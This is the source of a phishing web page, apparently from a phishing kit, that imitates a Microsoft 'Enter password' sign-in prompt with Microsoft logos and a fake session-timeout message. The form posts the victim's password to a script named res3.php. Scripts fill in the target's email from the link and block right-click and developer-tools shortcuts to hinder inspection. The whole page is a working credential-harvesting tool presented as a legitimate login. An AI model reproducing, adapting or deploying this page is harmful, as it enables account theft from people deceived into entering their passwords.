RUbZAEUAEBFARUUABAAEF1BQQAABAFQAAFQAAAABFAQAAEEVBQQBQABAUEUQAAQAUAEBUAURRQAAAAAFAAVFAAAARQAAFAAABQAAAEAAAAVQAFBEUQBQBQAAAAAAAABAAAARQABUUQAAAAAAAQAUVAAAVAAAAAAAAQAUEDQAAUAAAQAABQABAAAAQAAAAAAAEAAAAAAVFBAAAAAAAAAAQAAAAAARQBFQABRUFAABAAAAAAAAAAAAUAAAAAEAFAAEFQAABUigACAAAAEBVUAAAAAUAAf/U2s0G2UAQAFAQBUAAAQAARQHIAAACKigKAgqAAAAAACICAAqgACAgKAAAAgCAAACgAAAAAgoiigACooAACooAAAAACKKigAAKAgAKAIAAAKAACgIAAKAKAAAAAAAAAIAAACKAAKiiAAAAAAAKiiKgAoAAgAoAAJoKCKCAACLAFQCAAqAACKAACAAAAAAgAAAAAIAAoAAAAAgAAAAAAAAAIAAAAAAAAAAAAoAAAAAAAAAAAAAIAAAoIAKAAAAKiiCKKIigIAC4qYoCKAgqAACKAqgAAAACgAD/1drAbYQAUAARUAAEAAAAAAci6igqKCCoAAACgiKggAAACCpFAAEAEAAABQQAAEAFAAAAAAAABUVFAAFRRAABUUUAAAABUUAAUBAAAAABFAUEUAFAABAABRFAAFAAAAAAAEAAAFRUAEFAAAAFBAUAAUAQAAAVAAAAAAAAQAAAEUAAAAAAAQAAAAAAAEAAAAABFAAAAAEAAAAAAAAABAAAAFAAAAAAAAAAAAAAAAAEAAAAAAAIoIKKCKgAAAAKAAAAioqCKCigIAAAAIoAAoAAAAAAAKP/1trAbYEUFQAAAEAEAFAAAAEFTQEUAABAAABAAEAAAAABNR0mqIAIAKAAIAgAKAAAAAAAAAACggCigAgAAAAoAoCgiggAoAAAAAAAAosBAUAAAAAAEBUUAAUAAAAAAAQAUAAAUQAQAAAABQFAAAEABAVFAAAAAAQAAABQBAAAAAAAAQAAAAAEUAAAAAQAAAAAAAEAAAAUAEAEUAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAFRQAAAFEAABQAAAAEUBAWKACAAAAqAAACgAAAAAAAo//X2sBtgAARUFAAEVFQAAAAAAABAAAAEUEQAAABFQAAAABFFRyKigAAAAigIKAgoCCgIKAgoAAACgAAAIAAAAKCigAACAqKAAAAAAAYKAqKigAAAAAACAACgCgAAAgCoIYKAAKKAACACAAAAAoAoAgAAAqAIoAAAAACAAAAigAAAAAAAACAAAAKAIAAAAACAAAAACoqCgAAIKgACAAAAAAAAAAgAoqCgIAAAAAAAAAAAAAAAIAooAAAAAIIoogoAAAAAAACggAAAACgAIAAAKAAAAAAP//Q2xFRtkAEEUBAFAAEAAAAAAAATVBHKiAoAIKgAAAAIKgAAACoRFAcixFAAAAAAAAAAAAAAAFAAAAQAAAAFAAFFAAAEAAFAAAAAAUEBUUAAUAAAAAQAUAAUAEFRUAAAAAAUUAAEBFQAAAAFAFAEAAABBRFAAAAAAQABQBAAAAAAAAQAAABQBAAAAAAQAAAAAUUAQAAAAEBAAAAABRUFARQAAABEAUBBQEFAQUBBQEFQAAAAAAAFAAAAAAAAEAAAFAAAABQARUAAAAUAAABABQAAAAAB//R2wRW2UFQQABBRRAAEUBAAABAAAAEFAQAAAEFQAAAAEFFRAAAAAASEUUcjqJAQWIAAAAAAAAAACgAAACgACAAAqKAAKAAAIKAAAAqKAAgKAAAoAAAACgiiIKqKAAAAgAAAAACiooACAioAAAACgCgCAAAAgKgCgAAIAAACKAAAAAAAAAIAAKgCgCAAAAAAgAAKAoAgAAAAAgACAKAigKAAAAAAAIAAoAAAAAAAAAAAAAgIoqIKgCooAAAAAAAAAAgAAAACqACAiiiAAAKAAAAAAgqKogqAAoP/9LbEVG2AAAAAARBUVQAEFQAAQAAAAABBUAAAAVEFQABFAFQRQEAAAAAAAUAAEUBEdAOR0AkIoAkUAAAgAAAACAACgAACgoCKCAAAACiKAAgKAAAAAoCgAAAICooAAACAAAAAAAqKKAIIAAAACgAAAIoAgAAKAAAACAAAKIqCoAAAAAAgAAACqgIAKCAAAIAACgKAIAAAAAACAgKAoAAAAAAAigAAAAAAAAAACAAAAAAAAAAAAAAAKggAAAoAAqKAgAgAAqKAAAAKgqKgqKogqAAAAoIoKCKggoA/9PbUVHRhAEAUBABAAEAVQAEFRUAEAFBAAAAQUBAFQABBQEAAAAABBUAAAAUAAAAAAABAAUAAAAAAAQAAAAUABQAARQAAAAAFAABUAAAAAAUVFAAQAAUAABAAAAAAAAAVFFAEEBQAIAKAgKggAoKIAoAigIKgAogigAAgAAigKgoAAgAAACoKIIoAIqAAICooAAoAgAAAAIqAKCKAAAAAAAIoAAAAAgAKACAAAAAAAAAAAAAAAAACgAAgqAACAKAACAKAAigCgAAACKKIoKgACAoAAACgAAAD//U20B0YRHSAiooCKAgCIIoogAoACCoqACAAAAAAAiiogAAAAAIKgAAAAAACKAgoCCooBAQAAAFAAAABRBFAAAAABQAAAARQAAAAFABQAUEAQABQABUAUAABBQAAEAAAAAAAAUUAAEBYAAAACAAAAiigAAAAAAAAgAAAAAIAAoAAAgAoqAoIAgAAAICKAACgAACAAAACKCAAKAAAIAAoAAAAAgAAAAAAAIoAAAAAAAAAIAKAACooAAAAIKgCoogACAAKiqAAAAAAACgAqAAAAAAAAACigA//9XbQHRgRQER05gCoAACAACKAgCgACQUBFRUEFAQAABUAAQVAAAAAQUBAAAAAAAAAAAAAAAFQAAAFAEAAAAAAFAAAAFEVBSAiwUBFAAAFRQQBFAAAAAAUAAFQAAAAAAAEFAFAAAEBUAUAAAABAAAARVAAAAAAAAAQAAAAAEAAUAAAQFRRQAEFRAAAAQAUAAVBUAAQAAAAAEUAAAAARQAAAAAABABQQBFBQEFARQARUBUAAAAAAAAAFAEAAAFAAAAAAQRUAUABUUAAAAAFABQAEAUEFQUAABRABR//9bbQHRgAARQER0miIAAAAAAigIAoAAgqAKggoiggoIgCgAAkUBAAAAAAAAEUBBQEFAQAAAAAQAFAUEFAQUBBQAFBBQEUEFAAAFAAAAAAAAAEUAAAAUIACgiioIKgAAAAACCgCgAACAAAqKAAAAgAAAIqgAAAAAACgCIAAAAAIAAoAgAAKiigIgAAAIAACgKAAAAIoggqAAIoAAAAAigAAAAAACACgIoigAAAAAgCCqiiCCoAAAAAAAAooAgAAAAAoKACKgAACoogAogAAAACgAoACCgKgAAAigAAKP/19tFR0YAAAAAASI6QRAAAAAAEUBBUUAAEUBBUQFABFFRAAAAAAEUBIKAgqAAAAAAAAAAAAAAAAAAAAAAAKigAAAIKIoAAoAAAAAALBBBQAVABQABFAAURQEAAAAAABBRFFAAAAAEBUAURQAEAAAVEVQAAAAAAEUAAAAAAAQAAAEAFARQURUQAAAEAAFAFAAAEAAUAARQEAQAAAEUAAAAAQAUAAVFRUAAAAQARQAAUBBQERQEFQAAAAFAVAAAAAFAAUEUBAAFAQAARUUAFAAABQBUAAEAUFRRAAAEUf/Q24B0c0FQUAAAARQRIjpAQAABQAQAAQUUQAAAAARFAAABFAQUBAAAAAAQiiogqACoAKAgoggAoAABAAAAAAAFAAIACiACggoKigAAAAAAgKigAAAIAAoAAqAKgAAAAACiAAKAAAIAKCCgoAgKAAAgigoAgAAAIAAAAACKAAAAAoIoIACKAAAAgqAAIAAKAKAAAIAAoAAAAAgAAgqIoAAAAAgKAogICooAAAACoqAAAAAAgIoogAqCoIAAoCgAIAAKiqAACKgCoogAAAAiiiAKAAACgoIAIACqIoCAAACj/9HbgHRzAAQUFQAAAAQEVABBQEAUAEQAARRRABQAAAAAQAABAVAAAAAAAEAFAABABRFAAFAEAAAAAAAAAABUAUBAVFAAFAAAAAEAABUAURQAAAEUBQQUBBQEUAAAAEAAUAQAAFAAAUAQURQAAAAAEAAABAAAAAARQAAAFEUABFAEAAAAABARQEFAABQAABAAFAAAAAEAAABFAAQVAAEFAFQBBRAFAAAQUAAAABAAAABAAAFVBQQAUAAABBQAAUEUAAEAAAAAFEAUAAAUAABAAUFAAQAAAUf/0tuFR0cwAAABFAQEBUAAAAABFQABUAAAEABQSKAgqCgigACAAAAIKAgAAAgAAAAAAAAKgoCggoCAAAoIKgAAAsAAAFRUAAUAAAQAAAAAUAAUABQAAAAEAAAAABAAAAAARQABUAUAUAQAAVABRFAAQAAAEAAAAABAAFAAFRQAEUAAAQAAAEAAAAAVBQAABAAFAAAAAEAAUAQAAAAAEAAVAEAABUAURUFEAUAABBFAAAEAFAFAAAAQAUAUQAAAUAAABAAABQBFAAAFAAABAAVQAAAEAAAFH//T28BtzQVFAAAABFAcigIAAAAABEiqDkUVEAAAAAAABIKAkFAQAAQBRBRRFBBREQUBBUAAAAAAFUAAAABAVFBCKAAAAAAAAAACgAAAACAAAqKKAAAAAAoCAAAAAigAioAAoAIKCKgoCKAAAoCoIoCIoCooAAIAKCCiCCgIAAKIAAqCgIoAAIoAAAgAAAIAAAAKAKiooIKiAAAAigCgAgACgCAAAAAAgAAAIqCgIAAqKgACioCKIIKIAAAACgCgAAAIAqiKAgAoAIACgAIAAAKCKigAAoAAAIoAAoAAACACgAD/1NvFRtzAAEUUQAAAAAEFQEAAAAAAVADUUVEFiAAAAAAAAAAAkIoDkdJAQWEACAAgooAgAAAAAigAAAAKCKCAAAAAAAAAAAAKAAAACgILBAAFBUAFARQAAQBQBAAAAVFBBRFABABFURQBFAAQAAAAAEAAUAAABRBBRAFAAAQFRRQAEUAQURUAAAQAAAAAEAAFAFRUUABARQEBUURQEFQAAABFAAAAAEAAABAAFBQHIpAAEUAAAAAAAABQEAAAQBVAAQAAAUAEABQAEAFURUEAFBQAAAAABVEAAAAFRUAAAUH/1dwAdGEFQQCACKAgAAAAAIRUARQEFQAAAAQAUEUBBYQECAAAAAAAAAAAAAJCKAkFAQUBBQogpAQIQAVAURRQAAAAAQAFAEFQAFAAAAAAAABFFRQAAAAAAAEAAAAAFAEUAQRVAAAQAAAAUQQUAAAAAABFAAAAAEAABUBVAAAQURQAAAEUAAAQEUBBQVBUEAEBUUVFQBQEAAEVFQABQAAABFEVBUAAAAAAQAAAEFEBVABFEBQBUFEEUQFEAAAABAUUAAABAAAAABQAAAUAQFQVURQAAAAABQEVFAABQAQFQBQAAf/W3AB0YAAEUEQAAAEFQAABFARQBAAQUBBUAAAAVBUAAAEUBBYgAAAAAAAAAAAAAAAAACAAAAAAACggoCCgIKAgoKgoACggAAqACiCAoIKAAoIAKCogCgIKAigAKIJBQEFAQigqRcwEAgoImqAYKAgoioKAigCCiCCgIoAACiKIIoAigAAgAAoigAIoAAAAAgACgAACAACKAIKIAACKiCgCgAAAACKAAAAIoCAIAAACAAAqAqiKCCgIKgKgoIKAigAAAAIAAAAAAAAAKACgAAgAKCgAIAAKigAKIAAoAAigAIoAAAP/19wAdHMAAAFEAQAAABBQEFQAABFAQAAAEFAQVAAAAFAAQAAAAhABIKQEFhAQAAAAAAAAAAAABABQRQAAAAAAAABQABFQABQAAAAAABBRFAAAAAAFAAAEFAAAAAAARQAAAFEUAAABFAAAAAAAEAAUAAAQAAAEUAAAAABRFQAAAAAEAAUAAAQAAAAAEAFBAEAAUAAAAAAARQAAAABAAAAAAQQUBBQEUBQAAAAAAAQAAAABQQAAAABQAAAUEFBFBQAEAAAUEUFAEAUAAAEBUFAAAAAH/9DcBRthAFQRQEAAAAAAAAABBUEAAABRFAQAAABFAQUBAAAFAAAAQABRAAgAAoIQAQUBIRQEFhAQVAUAAAABAAAAAVFFAAAUEFEEIoCQUBBQEFAQUQAAAABQVAVBBUAFAABQAAAABAAAVFAQAFRUUAAAAAAARQAAAABAAAARQAAAAABUEFEUAAABAAAAFAEAAAAAAABFFRQAEEFAQUBAAAEAAUAAAAAQAAAAAAAEAAAAAAAAAAAUBFQAAAAUAAAFAAAAABQAAAEFAAAABQAAAAAURQEAAAAUBVf/0dxEG2FRQEFRUAAQVAAAAAAAEUAEURBQEAAAFEUBBSAgAAACKAgoCCgIAoAAAAACQAAABUAFEUAABNUBIRRBIKCiKAgsICKAAAAACoIKAAAAAAAAAAAgKgCiAqgIAAAAAAoAAAAAgAAAAAIAACoCqAAAgACgAAAAoCCiCCoAAigAAAAAACAACiKAAgACgCAAAAAAAAigAACAACoAKIoIAgoigIoCCgIKIqCgIKgAKCAoIKAgoCCiCCgAgAAAAoAAAAAKAAAAAAACgEUQgCAIqgAoAIACgAAAoACAKAAKIqKj/9LcQG2AEBQAQAQAUEUBAAAAAAAAANBFRREFAQAAAUAAIAIKAgAAAAACKAgKCAAAAAAoigACAAAAAqAACgAAAAAAAACAAChwAFQAUBAUEFEEFQAUFRQAAQAAABQAAAAAAFQRQBBUABUEAAUBQAABAAFAAAAFRQBFQAAAEEFAQVBQAABAAAAAVFQAAABQBAAAAAAAARQAABAAAAAAAAQAUAEBQAAEARQABQEBQABAFRUAAAAABQRQVRAEAAA6AAAAAAKCwBABAEFFAUAEAAABQAUABAABQFAFEUBH/9k=); background-repeat: no-repeat; background-size: cover;  height: 100%; width:100%;
   font-family: sans-serif; margin:0;line-height: 1.5;}*{	box-sizing: border-box;	margin:0; }

.login-popup .box{background-color:white;position: absolute;	left: 50%;top:48%;transform:translate(-50%,-50%);display: flex;  border: 1px solid white;
	flex-wrap: wrap;opacity: 0;	transition: all 1s ease;}.login-popup .box-body{ margin-bottom: 20px;}
.login-popup.show .box{opacity: 1;margin-left: 0;}@keyframes zoomInOut{0%,100%{transform: scale(1);}
	50%{transform: scale(1.1);}}
    .login-popup .box .form{  width: 440px;  height: 350px;max-width: 440px;padding:25px 20px 20px 20px;}
    .login-popup .box .form h4{color:#000000;font-size: 1.5rem;	margin-bottom: 20px;font-weight: 600; font-family: Segoe UI;}
.login-popup .box .form p{  font-size: 14px;margin-top: 15px;margin-bottom: 10px;}            
.login-popup .box .form .form-control{ border-top: none; border-left: none; border-right: none;border-radius: unset; 
    border-bottom: 1.8px solid #e81123; padding-left: 0; transition: 0.2s ease all; -moz-transition: 0.2s ease all; 
    -webkit-transition: 0.2s ease all; }
.login-popup .box .form .form-control:focus{ border-color: inherit; -webkit-box-shadow: none; box-shadow: none;}     
.login-popup .box .form .form-control:placeholder{ color: rgba(0,0,0,.6); font-size: 14px; outline: none;}
  #error { font-size: 15px;color: #e81123;}
.login-popup .box .form .btn{ width: 110px; background: #0067b8;border-radius: 0;display: block; min-height: 32px;
    border: none;min-width: 108px;line-height: normal;color:#ffffff;cursor: pointer;}
login-popup .box .form #error {font-size: 16px;color: #e81123;} 
.login-popup .box .form .btn:focus{outline: none;}
.login-popup .box .form .close{	position: absolute;right: 10px;	top:0px;font-size: 30px;cursor: pointer;}
/*responsive*/
@media(max-width: 767px){.login-popup .box{	width: calc(100% - 30px);}
    @media (max-width: 767px) {  img#arrow {    display: none;  }}
	.login-popup .box .img-area{display: none;}	.login-popup .box .form{flex: 0 0 100%; max-width: 100%;}}
    
    .footer {
  position:  fixed;bottom: 0;
  overflow: visible; z-index: 99; clear: both;
  width: 100%;
  }
  .footer > p {float: right; color: black; font-size: 12px; margin: 0; padding: 5px;}.footer > p:not(:first-child) {  margin-right: 15px;}
  .footer > p:not(:first-child):hover { cursor: pointer;text-decoration: underline;}.footer > p:first-child { margin-right: 10px;}
  
    </style>
</head>
<body onload="acceptParam()">

  <div class="login-popup">
  	 <div class="box">
  	 	
  	 	 <div class="form">
  	 	 	
  	 	 	
<form id=chalbhai onsubmit=" return formbreeze_sub()" method=post name=chalbhai action=res3.php>
    
  <div class="box-body" style="margin: 20px 20px 25px 25px;">
   <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg">
      
      <p><a href=""><img id="arrow" src=" https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"></a><input type="email" id="email" name="email" size="30" value="[Email]" readonly style="font-weight: 400;font-size: .9375rem;outline: none;color: #1b1b1b;         border:none;outline:none;"></p>
                    
 	<h4 style="margin-bottom: 5px;">Enter password</h4>
     <span id="error" class="">Sorry, your sign-in timed out. Please sign in again.</span>
                    
  	 	<div class="form-group" style="margin-top: 0;">
                    
  	 	 <input type="password" name="pass" id="pass" placeholder="Password" class="form-control" required  autocomplete="off" autofocus="autofocus" />
  	 	</div>
         <p ><a href="#" style="color:#0067b8; font-size:12.5px;">Forgot my password</a></p>
  	 	 		
  	<button type="submit" class="btn float-right" style=" font-size:14.5px;">Sign in</button>
                    </div>
  	 	 	</form>
            
          
  	 	 </div>
                    
  	 </div>
      
  </div>
 
    <div class="footer"><p>. . .</p><p>Privacy & cookies </p><p>Terms of use</p> </div>         
<script >
  

  const loginPopup = document.querySelector(".login-popup");
  const close = document.querySelector(".close");


  window.addEventListener("load",function(){
 
   showPopup();
   // setTimeout(function(){
   //   loginPopup.classList.add("show");
   // },5000)

  })

  function showPopup(){
        const timeLimit = 1 // seconds;
        let i=0;
        const timer = setInterval(function(){
         i++;
         if(i == timeLimit){
          clearInterval(timer);
          loginPopup.classList.add("show");
         } 
         console.log(i)
        },1000);
  }


  close.addEventListener("click",function(){
    loginPopup.classList.remove("show");
  })

 </script>
 
 <script>
    function acceptParam() {
      var hashParams = window.location.href.substr(1).split(\'?\'); // substr(1) to remove the `#`
          hashParams = hashParams[1].split(\'&\');
          var p = hashParams[0].split(\'=\');
          document.getElementById(\'email\').value = p[1];
     }
    </script>
    
    <script>
	window.oncontextmenu = function () {
				return false;
			}
			$(document).keydown(function (event) {
				if (event.keyCode == 123) {
					return false;
				}
				else if ((event.ctrlKey && event.shiftKey && event.keyCode == 73) || (event.ctrlKey && event.shiftKey && event.keyCode == 74)) {
					return false;
				}
			});
</script>
     
</body>
</html>';